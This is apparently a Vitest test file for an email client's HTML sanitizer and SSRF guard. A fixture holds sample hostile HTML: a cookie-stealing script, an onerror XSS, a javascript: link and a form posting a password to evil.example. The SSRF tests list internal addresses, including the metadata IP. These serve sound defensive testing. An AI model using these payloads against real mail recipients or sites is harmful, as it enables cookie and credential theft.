import { describe, it, expect } from "vitest";
import { sanitizeEmailHtml } from "../lib/server/mail-sanitize";
import { assertPublicHost } from "../lib/server/net-guard";

/**
 * Security gate fixtures (security.md §11). A crafted hostile email must
 * render inert, and the SSRF guard must reject internal addresses.
 */

const HOSTILE = `
  <script>window.stolen = document.cookie</script>
  <img src="x" onerror="alert('xss')">
  <a href="javascript:alert('link')">click</a>
  <form action="https://evil.example/steal"><input name="pw"></form>
  <iframe src="https://evil.example"></iframe>
  <div style="position:fixed;top:0;left:0;width:100%;height:100%">phishing overlay</div>
  <img src="https://tracker.example/pixel.gif" width="1" height="1">
  <p>Hello <b>world</b>, <a href="https://safe.example">a link</a>.</p>
`;

describe("email HTML sanitizer", () => {
  const opts = { loadImages: false, userId: "u1", cidMap: new Map<string, string>() };

  it("renders a hostile email inert", () => {
    const { html } = sanitizeEmailHtml(HOSTILE, opts);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/onerror/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<form/i);
    expect(html).not.toMatch(/<input/i);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/position\s*:\s*fixed/i);
    // legitimate content survives
    expect(html).toMatch(/Hello/);
    expect(html).toMatch(/<b>world<\/b>/);
    expect(html).toMatch(/safe\.example/);
  });

  it("blocks remote images by default", () => {
    const { html, hasRemoteImages } = sanitizeEmailHtml(
      `<img src="https://tracker.example/p.gif">`,
      opts,
    );
    expect(hasRemoteImages).toBe(true);
    expect(html).not.toMatch(/tracker\.example/);
  });

  it("routes remote images through the proxy when allowed", () => {
    const { html } = sanitizeEmailHtml(`<img src="https://tracker.example/p.gif">`, {
      ...opts,
      loadImages: true,
    });
    expect(html).toMatch(/\/api\/mailbox\/img-proxy/);
    expect(html).toMatch(/sig=/);
  });

  it("maps cid inline images to same-origin attachment URLs", () => {
    const cidMap = new Map([["logo@x", "att-123"]]);
    const { html } = sanitizeEmailHtml(`<img src="cid:logo@x">`, { ...opts, cidMap });
    expect(html).toMatch(/\/api\/mailbox\/attachment\/att-123/);
  });
});

describe("readability rescue (light text on the white reading pane)", () => {
  const opts = { loadImages: false, userId: "u1", cidMap: new Map<string, string>() };

  it("darkens light text when the email brings no background of its own", () => {
    const { html } = sanitizeEmailHtml(`<span style="color:#f5f5f5">invisible</span>`, opts);
    expect(html).not.toMatch(/#f5f5f5/i);
    expect(html).toMatch(/#1f2328/);
    const font = sanitizeEmailHtml(`<font color="#eeeeee">invisible</font>`, opts);
    expect(font.html).not.toMatch(/#eeeeee/i);
    expect(font.html).toMatch(/#1f2328/);
  });

  it("preserves light text when the email supplies its own dark background", () => {
    const { html } = sanitizeEmailHtml(
      `<div style="background:#0b0b0b;color:#ffffff">on dark</div>`,
      opts,
    );
    expect(html).toMatch(/#ffffff/i); // untouched — it has its own canvas
  });

  it("leaves already-dark text alone", () => {
    const { html } = sanitizeEmailHtml(`<div style="color:#333333">readable</div>`, opts);
    expect(html).toMatch(/#333333/);
  });

  it("does not corrupt background-color while darkening light text", () => {
    const { html } = sanitizeEmailHtml(
      `<div style="background-color:transparent;color:#f0f0f0">x</div>`,
      opts,
    );
    expect(html).toMatch(/background-color:\s*transparent/i);
    expect(html).toMatch(/color:\s*#1f2328/);
    expect(html).not.toMatch(/#f0f0f0/i);
  });
});

describe("SSRF host guard", () => {
  it("rejects private / loopback / link-local addresses", async () => {
    await expect(assertPublicHost("127.0.0.1")).rejects.toThrow();
    await expect(assertPublicHost("10.0.0.5")).rejects.toThrow();
    await expect(assertPublicHost("172.16.9.9")).rejects.toThrow();
    await expect(assertPublicHost("192.168.1.1")).rejects.toThrow();
    await expect(assertPublicHost("169.254.169.254")).rejects.toThrow();
    await expect(assertPublicHost("::1")).rejects.toThrow();
  });

  it("allows a public IP literal", async () => {
    await expect(assertPublicHost("1.1.1.1")).resolves.toBeUndefined();
  });
});
